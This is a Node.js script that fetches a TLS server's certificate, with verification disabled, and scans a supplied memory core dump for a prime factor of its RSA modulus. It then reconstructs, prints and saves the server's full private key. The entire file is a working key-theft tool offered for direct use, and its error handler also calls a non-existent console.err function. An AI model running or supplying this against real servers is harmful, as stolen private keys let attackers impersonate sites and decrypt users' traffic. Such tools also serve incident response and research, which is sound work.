#!/usr/bin/env nodejs
var constants = require('constants');
var fs = require('fs');
const tls = require('tls');
const bignum = require('bignum');
const dns = require('dns');
const asn1 = require('asn1.js');
const rfc3280 = require('asn1.js-rfc3280');

const argv = require('yargs')
        .demand([ 'host', 'core' ])
        .alias('h', 'host')
        .alias('p', 'port')
        .alias('c', 'core')
        .alias('s', 'seq')
        .alias('k', 'keyfile')
        .default('port', 443)
        .argv;

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

console.error('Searching for private keys...');

dns.lookup(argv.host, function(err, addr) {
    if (err) processError('Can\'t resolve hostname', err);
    getClientCertificate(addr, argv.port | 0, argv.host);
});


function getClientCertificate(ip, port, host) {
    var s = tls.connect({
        port: port,
        host: ip,
        ciphers: null,
        secureOptions: constants.SSL_OP_NO_SSLv2 |
            constants.SSL_OP_NO_SSLv3 |
            constants.SSL_OP_NO_TLSv1
    }, function() {
        let cert = s.getPeerCertificate();
        let m = bignum(cert.modulus, 16);
        let e = bignum(cert.exponent, 10);
        let primeSize = cert.modulus.length / 4;

        console.error('Cert loaded...');

        processCoreFile(m, e, primeSize)

    });
    s.once('error', function(err) { processError('Can\'t get certificate', err) });
    s.setTimeout(10000, function() {
        s.destroy();
    });
}

function processCoreFile(m, e, primeSize) {
    fs.readFile(argv.core, function(err, data) {
        if (err) processError('Can\'t read file', err);
        searchPrivKey(data, m, e, primeSize);
    }); 
}

function searchPrivKey(data, m, e, primeSize) {
    const ZERO = new bignum('0');
    var size = primeSize;
    var delta = argv.seq ? 1 : 8;
    for (var i = 0; i < data.length - size - 1; i += delta) {
        // Ignore even numbers, and ones that are not terminating with `0`
        if (data[i] % 2 === 0 || data[i + size] !== 0)
            continue;
        var p = data.slice(i, i + size);

        // Skip completely empty data
        for (var j = p.length - 1; j >= 0; j--)
            if (p[j] !== 0)
                break;
        if (j < 0)
            continue;

        // Skip `ones`
        if (j == 0 && p[0] == 1)
            continue;

        var prime = bignum.fromBuffer(p, {
            endian: 'little',
            size: 'auto'
        });
        if (m.mod(prime).eq(ZERO)) {
            console.error('Found key at offset: %d!', i);
            console.log('The prime is: ' + prime.toString(16) + '\n');
            var privateKeyString = getPrivateKey(prime, m, e);
            console.log('The private key is:\n' + privateKeyString + '\n');

            if (argv.keyfile) {
                fs.writeFileSync(argv.keyfile, privateKeyString); 
            }
            process.exit();
        }
    }
}

var RSAPrivateKey = asn1.define('RSAPrivateKey', function() {
    this.seq().obj(
        this.key('version').int(),
        this.key('modulus').int(),
        this.key('publicExponent').int(),
        this.key('privateExponent').int(),
        this.key('prime1').int(),
        this.key('prime2').int(),
        this.key('exponent1').int(),
        this.key('exponent2').int(),
        this.key('coefficient').int()
    );
});

function getPrivateKey(p1, m, e) {
    var p2 = m.div(p1);

    var dp1 = p1.sub(1);
    var dp2 = p2.sub(1);
    var phi = dp1.mul(dp2);

    var d = e.invertm(phi);
    var exp1 = d.mod(dp1);
    var exp2 = d.mod(dp2);
    var coeff = p2.invertm(p1);

    var buf = RSAPrivateKey.encode({
        version: 0,
        modulus: m,
        publicExponent: e,
        privateExponent: d,
        prime1: p1,
        prime2: p2,
        exponent1: exp1,
        exponent2: exp2,
        coefficient: coeff
    }, 'der');

    buf = buf.toString('base64');
    var lines = [ '-----BEGIN RSA PRIVATE KEY-----' ];
    for (var i = 0; i < buf.length; i += 64)
        lines.push(buf.slice(i, i + 64));
    lines.push('-----END RSA PRIVATE KEY-----', '');
    return lines.join('\n');
}

function processError(message, err, exitStatus) {
    console.err(message);
    console.err(err);
    process.exit(exitStatus||1);
}
